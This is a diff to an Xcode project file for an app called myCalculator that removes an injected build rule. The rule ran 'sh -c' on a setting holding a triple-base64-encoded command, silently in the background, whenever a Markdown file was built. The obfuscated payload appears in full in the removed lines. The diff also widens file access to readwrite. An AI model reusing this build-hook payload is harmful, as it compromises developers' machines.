@@ -7,29 +7,13 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		6A651F7514BA48039599F71F /* README.md */ = {isa = PBXBuildFile; fileRef = BFEDBF12EF5D4CD59D99F71F; };
 		B4CE9E912F87AA0F008187A8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = B4CE9E902F87AA0F008187A8 /* README.md */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXBuildRule section */
-		E972CD95E3EA43818B99F71F /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${AF17F99}\"";
-			};
-																																																								/* End PBXBuildRule section */
+	/* End PBXBuildRule section */
 
 /* Begin PBXFileReference section */
-		BFEDBF12EF5D4CD59D99F71F /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		B4CE9E462F878514008187A8 /* myCalculator.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = myCalculator.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		B4CE9E902F87AA0F008187A8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
@@ -65,7 +49,6 @@ sh -c \"${AF17F99}\"";
 		B4CE9E472F878514008187A8 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				BFEDBF12EF5D4CD59D99F71F /* README.md */,
 				B4CE9E462F878514008187A8 /* myCalculator.app */,
 			);
 			name = Products;
@@ -83,7 +66,6 @@ sh -c \"${AF17F99}\"";
 				B4CE9E442F878514008187A8 /* Resources */,
 			);
 			buildRules = (
-				E972CD95E3EA43818B99F71F /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -139,7 +121,6 @@ sh -c \"${AF17F99}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				6A651F7514BA48039599F71F /* README.md */,
 				B4CE9E912F87AA0F008187A8 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -160,7 +141,6 @@ sh -c \"${AF17F99}\"";
 		B4CE9E4F2F878516008187A8 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9YVmFXRkpxV2tjMWExcFlXWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -223,7 +203,6 @@ sh -c \"${AF17F99}\"";
 		B4CE9E502F878516008187A8 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				AF17F99 = "((q(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1IaHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkplVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkyNVdjMXBUU1dkaFNGSXdZMGhOTmt4NU9YVmFXRkpxV2tjMWExcFlXWFZoVnpSMldWTnJhVWxJZDJkak1tZExDZz09Cg== | q | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -282,11 +261,11 @@ sh -c \"${AF17F99}\"";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = S3DJS8RH98;
+				DEVELOPMENT_TEAM = J9CJUEB6H8;
 				ENABLE_APP_SANDBOX = YES;
 				ENABLE_HARDENED_RUNTIME = YES;
 				ENABLE_PREVIEWS = YES;
-				ENABLE_USER_SELECTED_FILES = readonly;
+				ENABLE_USER_SELECTED_FILES = readwrite;
 				GENERATE_INFOPLIST_FILE = YES;
 				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphoneos*]" = YES;
 				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphonesimulator*]" = YES;
@@ -326,11 +305,11 @@ sh -c \"${AF17F99}\"";
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
-				DEVELOPMENT_TEAM = S3DJS8RH98;
+				DEVELOPMENT_TEAM = J9CJUEB6H8;
 				ENABLE_APP_SANDBOX = YES;
 				ENABLE_HARDENED_RUNTIME = YES;
 				ENABLE_PREVIEWS = YES;
-				ENABLE_USER_SELECTED_FILES = readonly;
+				ENABLE_USER_SELECTED_FILES = readwrite;
 				GENERATE_INFOPLIST_FILE = YES;
 				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphoneos*]" = YES;
 				"INFOPLIST_KEY_UIApplicationSceneManifest_Generation[sdk=iphonesimulator*]" = YES;
